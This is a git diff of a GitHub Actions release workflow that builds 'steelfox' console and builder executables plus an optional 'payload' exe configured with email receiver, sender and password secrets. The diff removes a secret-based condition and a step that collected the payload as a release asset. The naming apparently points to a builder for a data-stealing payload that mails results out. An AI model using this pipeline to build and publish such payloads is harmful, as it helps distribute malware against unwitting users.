@@ -52,37 +52,22 @@ jobs:
         run: python build_builder.py
 
       - name: Build Payload Exe (optional - requires email secrets or inputs)
-        # Runs only when credentials are provided (via secrets OR workflow_dispatch inputs)
+        # secrets cannot be used in if: conditions; credentials validated inside builder_cli.py
+        # continue-on-error keeps the release going when no credentials are configured
         env:
           SF_RECEIVER: ${{ github.event.inputs.receiver || secrets.SF_RECEIVER }}
           SF_SENDER:   ${{ github.event.inputs.sender   || secrets.SF_SENDER }}
           SF_PASSWORD: ${{ secrets.SF_PASSWORD }}
           SF_NAME:     ${{ github.event.inputs.payload_name || secrets.SF_NAME || 'output' }}
           SF_OUTPUT:   '.'
-        if: |
-          (github.event.inputs.receiver != '' || secrets.SF_RECEIVER != '') &&
-          secrets.SF_PASSWORD != ''
         run: python builder_cli.py
-        continue-on-error: true  # Don't fail the whole release if no creds provided
+        continue-on-error: true
 
       - name: Verify Required Executables
         run: |
           if (!(Test-Path "steelfox_console.exe")) { throw "steelfox_console.exe missing!" }
           if (!(Test-Path "steelfox_builder.exe")) { throw "steelfox_builder.exe missing!" }
           Write-Host "Core executables verified."
-
-      - name: Collect Release Assets
-        id: collect
-        run: |
-          $files = @("steelfox_console.exe", "steelfox_builder.exe")
-          $payload = Get-Item "*.exe" -Exclude "steelfox_console.exe","steelfox_builder.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
-          if ($payload) {
-            Write-Host "Payload exe found: $($payload.Name)"
-            $files += $payload.FullName
-            echo "payload_found=true" >> $env:GITHUB_OUTPUT
-          } else {
-            echo "payload_found=false" >> $env:GITHUB_OUTPUT
-          }
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
